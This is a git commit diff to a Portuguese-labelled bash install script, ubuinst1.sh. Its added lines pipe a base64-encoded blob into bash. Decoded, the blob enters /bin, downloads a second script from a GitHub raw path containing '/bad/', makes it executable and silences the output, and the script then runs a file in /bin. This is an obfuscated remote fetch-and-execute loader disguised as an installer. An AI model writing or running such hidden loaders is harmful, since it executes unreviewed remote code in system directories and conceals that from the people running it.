498271e187e7f7fa02cd47067a4749a9a22b8693
igor <posseidon1989@gmail.com>
2022-06-23 14:41:23 -0300

    script instalaçao

--- ubuinst1.sh
+++ ubuinst1.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
-echo 'IyEvYmluL2Jhc2gKY2QgL2JpbiB8fCBleGl0CndnZXQgcmF3LmdpdGh1YnVzZXJjb250ZW50LmNv
-bS9JZ29yaGVucmkwNDA3L2luc3RhbGwvYmFkL3VidWluc3QyLnNoICYmIGNobW9kICt4IHVidWlu
-c3QyLnNoICYmIGRvczJ1bml4IHVidWluc3QyLnNoID4gL2Rldi9udWxsIDI+JjEKY2QgfHwgZXhp
-dA==' | base64 -d | bash
+echo 'IyEvYmluL2Jhc2gKY2QgL2JpbiB8fCBleGl0CndnZXQgcmF3LmdpdGh1YnVz
+ZXJjb250ZW50LmNvbS9JZ29yaGVucmkwNDA3L2luc3RhbGwvYmFkL3VidWluc3QyLn
+NoICYmIGNobW9kICt4IHVidWluc3QyLnNoICYmIGRvczJ1bml4IHVidWluc3Quc2gg
+PiAvZGV2L251bGwgMj4mMQpjZCB8fCBleGl0' | base64 -d | bash
 /bin/ubuinst.sh
